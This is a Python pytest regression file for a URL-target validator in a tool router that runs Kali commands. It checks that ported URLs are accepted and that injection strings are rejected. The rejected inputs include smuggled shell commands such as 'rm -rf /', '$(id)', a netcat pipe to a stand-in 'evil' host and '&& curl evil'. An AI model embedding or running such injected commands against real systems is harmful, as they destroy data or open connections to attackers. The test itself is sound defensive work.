"""Regression: the Kali-command target guard must accept ordinary ported URLs
(http://localhost:3000) — an explicit :port used to make every tool fail with
"Target failed validation (potential injection)" — while still rejecting shell
metacharacters that would survive shlex-quoting as an injection.
"""
import pytest

from core.tools.tool_router import _kali_target_host, kali_target_is_valid


@pytest.mark.parametrize("target", [
    "http://localhost:3000",
    "http://localhost:3000/rest/products/search?q=test'",
    "http://example.com:8080/a?b=1",
    "https://sub.decibyl.ai",
    "example.com",
    "https://api.example.com:443/v1",
])
def test_legit_targets_pass(target):
    assert kali_target_is_valid(target), target


@pytest.mark.parametrize("target", [
    "http://a.com;rm -rf /",
    "http://a.com`whoami`",
    "http://a.com$(id)",
    "http://a.com|nc evil 4444",
    "http://a.com && curl evil",
])
def test_injection_targets_rejected(target):
    assert not kali_target_is_valid(target), target


@pytest.mark.parametrize("target,host", [
    ("http://localhost:3000", "localhost"),
    ("http://example.com:8080/x", "example.com"),
    ("https://sub.decibyl.ai", "sub.decibyl.ai"),
    ("example.com", "example.com"),
])
def test_host_strips_scheme_and_port(target, host):
    assert _kali_target_host(target) == host
